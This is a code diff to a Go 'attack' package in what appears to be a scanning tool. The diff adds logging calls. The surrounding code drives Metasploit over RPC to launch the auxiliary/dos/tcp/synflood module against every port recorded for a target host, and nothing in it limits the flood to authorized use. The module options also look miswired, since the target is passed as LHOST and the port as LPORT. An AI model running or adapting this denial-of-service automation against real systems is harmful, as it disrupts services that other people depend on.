@@ -1,7 +1,7 @@
 package attack
 
 import (
-	"fmt"
+	"strconv"
 	"toolscan/core/model"
 	"toolscan/core/utils"
 
@@ -12,6 +12,7 @@ import (
 func MetasploitAttack(kind string, target string) {
 	switch kind {
 	case "ddos":
+		utils.Config.Log.LogInfo("Executing DDOS attack on " + target)
 		DDOSAll(utils.Config.DB, target)
 	default:
 		utils.Config.Log.LogInfo("Can't perform attack")
@@ -34,13 +35,15 @@ func DDOSAll(db *gorm.DB, target string) {
 		panic(err)
 	}
 	defer client.Logout()
-
+	utils.Config.Log.LogInfo("Create client RPC to metasploit successfully")
 	for _, port := range ports {
+		utils.Config.Log.LogInfo("Executing DDOS attack on port " + strconv.Itoa(port.Number))
 		DDOSSingle(target, port.Number, client)
 	}
 }
 
 func DDOSSingle(target string, port int, client *gomsf.Client) {
+	utils.Config.Log.LogInfo("Use module auxiliary/dos/tcp/synflood")
 	executeResult, err := client.Module.Execute(gomsf.ExploitType, "auxiliary/dos/tcp/synflood", map[string]interface{}{
 		"LHOST": target,
 		"LPORT": port,
@@ -48,6 +51,6 @@ func DDOSSingle(target string, port int, client *gomsf.Client) {
 	if err != nil {
 		panic(err)
 	}
-	fmt.Printf("JobID: %d\n", executeResult.JobID)
-	fmt.Printf("UUID: %s\n", executeResult.UUID)
+	utils.Config.Log.LogInfo("JobID: " + strconv.Itoa(int(executeResult.JobID)))
+	utils.Config.Log.LogInfo("UUID: " + executeResult.UUID)
 }
